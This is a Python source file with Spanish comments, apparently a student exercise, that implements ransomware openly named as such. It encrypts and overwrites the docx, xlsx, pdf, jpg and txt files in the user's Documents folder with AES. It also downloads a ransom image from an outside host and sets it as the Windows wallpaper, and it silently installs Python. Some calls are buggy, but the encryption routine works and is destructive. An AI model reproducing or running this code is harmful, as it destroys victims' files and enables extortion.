from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os
import ctypes
import sys
import requests
import subprocess

class ransomWare():
    llavePublicaRSA = b"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R9X+"


    def instalaPython(self):
        # Comando para instalar Python (ejemplo para Windows)
        command = "msiexec /i python-3.12.0-amd64 /quiet /qn /norestart"

        # Ejecuta el comando
        subprocess.run(command, shell=True)
    '''
     * Instala un paquete específico.
    '''
    def instalaPaquetes(self, paquete):  
        subprocess.run(["pip", "install", paquete])

    '''
     * Se deben cifrar los archivos con las siguientes extensiones:
     * docx, xlsx, pdf, jpeg, jpg, txt
    '''
    def ransom(self,clave_aes):
        user_folder = os.path.expanduser("~")
        document_folder = os.path.join(user_folder, "Documents")
        # Verifica si la carpeta existe
        if os.path.exists(document_folder):
            for archivo in os.listdir(document_folder):                
                if('.' in archivo):
                    print("Revisando ",archivo)
                    extension = archivo.split(".")
                    ext = extension[1]
                    if(ext == "txt" or ext == "jpg" or ext == "jpeg" or ext == "pdf" or ext == "jpg" or ext == "xlsx" or ext == "docx" ):
                        datos_cifrados = self.cifrar_archivo(document_folder+'\\'+archivo, clave_aes)
                        self.guardar_archivo_cifrado(document_folder+'\\'+archivo, datos_cifrados)
                
    '''
     * Cifra un archivo
    '''
    def cifrar_archivo(self, ruta_archivo, clave_aes):
        with open(ruta_archivo, 'rb') as f:
            datos = f.read()

        iv = os.urandom(16)

        cipher = Cipher(algorithms.AES(clave_aes), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        datos_cifrados = encryptor.update(datos) + encryptor.finalize()

        return iv + datos_cifrados
    '''
     * Guarda un archivo con la información de este mismo pero cifrada
    '''
    def guardar_archivo_cifrado(self,ruta_archivo, datos_cifrados):
        with open(ruta_archivo, 'wb') as f:
            f.write(datos_cifrados)

    def derivar_clave_aes(self):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            iterations=100000,
            salt=os.urandom(16),
            length=32,  # Longitud de la clave AES-256
            backend=default_backend()
        )
        llave = kdf.derive(self.llavePublicaRSA)
        with open("contraseñaprivada.txt", "wb") as f:
            f.write(llave)
        return llave 

        
    def cambiaImagen(self):
        self.descargaImagen()
        workdir = os.getcwd()
        ctypes.windll.user32.SystemParametersInfoW(20, 0, workdir+"\Fransom.jpg" , 0)

    def descargaImagen(self):
        url = "https://www.stormshield.com/wp-content/uploads/capture-1-4.png"
        response = requests.get(url)
        with open("Fransom.jpg", "wb") as f:
            f.write(response.content)  
def main():
    nuevo = ransomWare()
    nuevo.cambiaImagen()
    subprocess.run('cryptography', shell=True)
    nuevo.instalaPython()
    subprocess.run('requests', shell=True)
    # Derivar la clave AES a partir de la contraseña
    clave_aes = nuevo.derivar_clave_aes()
    print(clave_aes)
    nuevo.ransom(clave_aes)
if __name__ == '__main__':
    main()